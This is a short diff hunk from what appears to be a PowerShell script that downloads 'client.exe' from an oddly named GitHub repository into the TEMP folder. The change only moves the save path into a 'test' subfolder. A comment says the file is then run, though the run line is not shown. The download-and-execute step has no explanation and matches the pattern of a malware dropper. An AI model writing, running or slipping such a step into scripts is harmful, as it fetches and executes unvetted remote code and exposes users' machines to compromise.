@@ -7,7 +7,7 @@ try {
 
     # Download the client.exe file
     $exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
-    $exePath = "$env:TEMP\client.exe"
+    $exePath = "$env:TEMP\test\client.exe"
     Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
     # Run the downloaded client.exe
